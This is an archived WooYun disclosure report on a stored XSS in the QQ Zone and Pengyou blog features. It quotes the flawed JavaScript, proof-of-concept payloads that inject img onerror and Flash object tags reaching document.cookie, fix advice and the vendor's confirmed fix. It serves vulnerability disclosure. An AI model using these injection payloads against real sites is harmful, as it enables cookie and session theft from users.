@@ -1,0 +1,341 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PKAV腾讯专场 - 6. （QQ空间+朋友网）日志功能存储型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PKAV腾讯专场 - 6. （QQ空间+朋友网）日志功能存储型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-10-22 14:25</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-10-24：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-11-03：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-11-13：	细节向普通白帽子公开<br/>
+									2012-11-23：	细节向实习白帽子公开<br/>
+									2012-12-06：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">此漏洞影响腾讯2大主要的社区日志功能，QQ空间和朋友网的前端和后端是一套逻辑，就不分开提交了。漏洞相关信息日后会同步至pkav.net。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">缺陷文件：<br />
+<br />
+http://cnc.qzs.qq.com/qzone/newblog/v5/script/common.js<br />
+<br />
+http://qzs.pengyou.com/qzone/newblog/v5/script/common.js<br />
+<br />
+<br />
+<br />
+缺陷代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>QZBlog.Logic.initMusicPlayer = function() {<br />
+    var arr = document.getElementsByName(&quot;musicFlash**&quot;);<br />
+    if (arr.length &gt; 0) {<br />
+        var musicParams = [];<br />
+        for (var index = 0; index &lt; arr.length; ++index) {<br />
+            var ubb = arr[index].getAttribute(&#039;ubb&#039;);<br />
+            if ( !! ubb) {<br />
+                musicParams.push(ubb);<br />
+                if (!QZFL.userAgent.ie) {<br />
+                    var is_multi = ubb.split(&quot;|&quot;).length &gt; 7;<br />
+                    var width = arr[index].width;<br />
+                    var height = arr[index].height;<br />
+                    var _div_height = is_multi ? 200: 120;<br />
+                    var _div_width = is_multi ? 386: 360;<br />
+                    var src = &#039;http://&#039; + IMGCACHE_DOMAIN + &#039;/music/musicbox_v2_1/img/MusicFlash.swf&#039;;<br />
+                    var span = document.createElement(&#039;span&#039;);<br />
+                    span.style.cssText = &#039;display:inline-block; height:&#039; + _div_height + &#039;px;width:&#039; + _div_width + &#039;px; overflow:hidden; vertical-align:baseline&#039;;<br />
+                    var parent = arr[index].parentNode;<br />
+                    parent.replaceChild(span, arr[index]);<br />
+                    span.innerHTML = &#039;&lt;object type=&quot;application/x-shockwave-flash&quot; data=&quot;&#039; + src + &#039;&quot; width=&quot;&#039; + width + &#039;&quot; height=&quot;&#039; + height + &#039;&quot; name=&quot;musicFlash&#039; + (musicParams.length - 1) + &#039;&quot; id=&quot;musicFlash&#039; + (musicParams.length - 1) + &#039;&quot; align=&quot;middle&quot; ubb=&quot;&#039; + ubb + &#039;&quot;&gt;&#039; + &#039;&lt;param name=&quot;movie&quot; value=&quot;&#039; + src + &#039;&quot; /&gt;&#039; + &#039;&lt;param name=&quot;quality&quot; value=&quot;high&quot; /&gt;&#039; + &#039;&lt;param name=&quot;bgcolor&quot; value=&quot;#ffffff&quot; /&gt;&#039; + &#039;&lt;param name=&quot;play&quot; value=&quot;true&quot; /&gt;&#039; + &#039;&lt;param name=&quot;loop&quot; value=&quot;true&quot; /&gt;&#039; + &#039;&lt;param name=&quot;wmode&quot; value=&quot;transparent&quot; /&gt;&#039; + &#039;&lt;param name=&quot;scale&quot; value=&quot;showall&quot; /&gt;&#039; + &#039;&lt;param name=&quot;menu&quot; value=&quot;true&quot; /&gt;&#039; + &#039;&lt;param name=&quot;salign&quot; value=&quot;&quot; /&gt;&#039; + &#039;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;&#039; + &#039;&lt;/object&gt;&lt;/span&gt;&#039;;<br />
+                    index--;<br />
+                } else {<br />
+                    arr[index].id = &quot;musicFlash&quot; + (musicParams.length - 1);<br />
+                    if (QZFL.userAgent.ie &lt; 9) {<br />
+                        arr[index].name = &quot;musicFlash&quot; + (musicParams.length - 1);<br />
+                    }<br />
+                }<br />
+            }<br />
+        }<br />
+        if (musicParams.length &gt; 0) {<br />
+            var jsLoader = new QZONE.jsLoader();<br />
+            jsLoader.onload = function() {<br />
+                initMusicData.apply(null, musicParams);<br />
+            };<br />
+            jsLoader.load(&quot;/music/musicbox_v2_1/js/musicblog_player.js&quot;, document, &quot;GB2312&quot;);<br />
+        }<br />
+    }<br />
+};</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+1. 首先看看上面这个代码。<br />
+<br />
+<br />
+<br />
+2. 它的大致流程如下：<br />
+<br />
+<br />
+<br />
+2.1 搜索日志里所有name=&quot;musicFlash**&quot;的元素。然后循环对每一个元素处理<br />
+<br />
+<br />
+<br />
+2.2 拿一次循环为例，可以看到取出了name=&quot;musicFlash**&quot;元素的 ubb 属性。<br />
+<br />
+<br />
+<br />
+2.3 而后，在span.innerHTML这段代码中， ubb=&quot;&#039; + ubb + &#039;&quot; 这个地方直接加了进去。<br />
+<br />
+<br />
+<br />
+2.4 因此这里没有做过滤，会造成XSS。<br />
+<br />
+<br />
+<br />
+3. 那么利用代码怎么写呢？<br />
+<br />
+<br />
+<br />
+因为日志功能是富文本，不可能屏蔽掉所有的HTML标签。div 标记一般是允许的。那么我们利用div来编写利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div name=&quot;musicFlash**&quot; ubb=&quot;&amp;quot;&amp;gt;&amp;lt/object&amp;gt;&amp;lt;img src=&amp;quot;1&amp;quot; onerror=&amp;quot;alert(document.cookie);&amp;quot;&amp;gt;&amp;lt;i a=&amp;quot;&quot;&gt;xxxxxxxxx&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+嗯，上面就是利用代码了，很简单吧，发日志的时候，选择使用HTML方式，发送即可。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/221407314c6ee26cf579b9bf2d2e3ef1666e9b34.jpg" target="_blank"><img src="../images/221407314c6ee26cf579b9bf2d2e3ef1666e9b34.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+其它用户访问日志后，效果如下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/22140833ce5dde569283c05f843edf9ea34eae30.jpg" target="_blank"><img src="../images/22140833ce5dde569283c05f843edf9ea34eae30.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+打开调试工具，可以看到被inject进去的代码<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/221409205a891d3c5d3e5919b31830614659a2e7.jpg" target="_blank"><img src="../images/221409205a891d3c5d3e5919b31830614659a2e7.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 当然，还没完。。。 因为上面这个代码缺陷，仅限于非IE浏览器，为什么呢？<br />
+<br />
+<br />
+<br />
+主要是这句：如下图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/22141104af27e105e8852faba715d5ad1ec4cce5.jpg" target="_blank"><img src="../images/22141104af27e105e8852faba715d5ad1ec4cce5.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 我们的目标是：“没有蛀牙”，只有chrome下可以，有点鸡肋了。<br />
+<br />
+<br />
+<br />
+6. 其实这里还存在一个问题。最初测试时，发现腾讯并没有过滤掉object标签，只是对object调用的swf文件的域进行了限制。也就是说 ，发送一下HTML，是不会被过滤掉的<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div class=&quot;blog_details_20120222&quot;&gt;&lt;div&gt;&lt;object codeBase=&quot;http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0&quot; classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; width=&quot;410&quot; height=&quot;100&quot; src=&quot;http://qzs.qq.com/22222222222.swf&quot; bgcolor=&quot;#ffffff&quot; menu=&quot;true&quot; allowScriptAccess=&quot;always&quot; name=&quot;musicFlash**&quot; id=&quot;musicFlash0&quot; ubb=&#039;3041135817|1|http://1.qq.com/1&quot;&gt;&lt;img/src=&quot;1&quot;onerror=&quot;alert(1)&quot;&gt;&#039;&gt;&lt;param name=&quot;movie&quot; value=&quot;http://qzs.qq.com/22222222222.swf&quot; /&gt;&lt;param name=&quot;data&quot; value=&quot;http://ctc.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt;&lt;param name=&quot;bgColor&quot; value=&quot;#ffffff&quot; /&gt;&lt;param name=&quot;wmode&quot; value=&quot;transparent&quot; /&gt;&lt;param name=&quot;menu&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;&lt;/object&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+只要 movie的value是 http://qzs.qq.com域名下即可<br />
+<br />
+<br />
+<br />
+7. 更重要的是，这里的allowscriptaccess是等于always的。<br />
+<br />
+<br />
+<br />
+8. 那么我们只要找到一个 http://qzs.qq.com 域名下，具有缺陷的FLASH XSS即可。<br />
+<br />
+<br />
+<br />
+9. google , site:qzs.qq.com filetype:swf ，找到下面这个。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qzs.qq.com/qzone/mall/app/vip_reward/201110/swf/play.swf?flashInit=function(){alert(document.cookie)}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+10. 接着我们在发布日志时，发布以下利用代码即可。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div class=&quot;blog_details_20120222&quot;&gt;&lt;div&gt;&lt;object codeBase=&quot;http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0&quot; classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; width=&quot;410&quot; height=&quot;100&quot; src=&quot;http://qzs.qq.com/qzone/mall/app/vip_reward/201110/swf/play.swf?flashInit=function(){alert(document.cookie)}&quot; bgcolor=&quot;#ffffff&quot; menu=&quot;true&quot; allowScriptAccess=&quot;always&quot; name=&quot;musicFlash**&quot; id=&quot;musicFlash0&quot; ubb=&#039;3041135817|1|http://1.qq.com/1&quot;&gt;&lt;img/src=&quot;1&quot;onerror=&quot;alert(1)&quot;&gt;&#039;&gt;&lt;param name=&quot;movie&quot; value=&quot;http://qzs.qq.com/qzone/mall/app/vip_reward/201110/swf/play.swf?flashInit=function(){alert(document.cookie)}&quot; /&gt;&lt;param name=&quot;data&quot; value=&quot;http://ctc.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt;&lt;param name=&quot;bgColor&quot; value=&quot;#ffffff&quot; /&gt;&lt;param name=&quot;wmode&quot; value=&quot;transparent&quot; /&gt;&lt;param name=&quot;menu&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;&lt;/object&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+11. 看吧，这次IE也会弹啦。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/22141614af89304193f5618736dc823ce7f9e279.jpg" target="_blank"><img src="../images/22141614af89304193f5618736dc823ce7f9e279.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 修复 QZBlog.Logic.initMusicPlayer 中的缺陷，取出ubb属性后，进行二次过滤，再输出到innerHTML。<br />
+<br />
+<br />
+<br />
+2. 这个object的always，你们自己看着修复。本身object标签就是很危险的，感觉不应该直接输出到页面。<br />
+<br />
+<br />
+<br />
+3. 修复 http://qzs.qq.com/qzone/mall/app/vip_reward/201110/swf/play.swf?flashInit=function(){alert(document.cookie)} </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-013721" title="PKAV腾讯专场 - 6. （QQ空间+朋友网）日志功能存储型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-10-24 15:27</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2012-10-25：非常感谢您的报告，目前已经完成对该漏洞的修复，请您帮助复查，有任何问题请联系我们。</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="13721";
+var bugRating="2";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
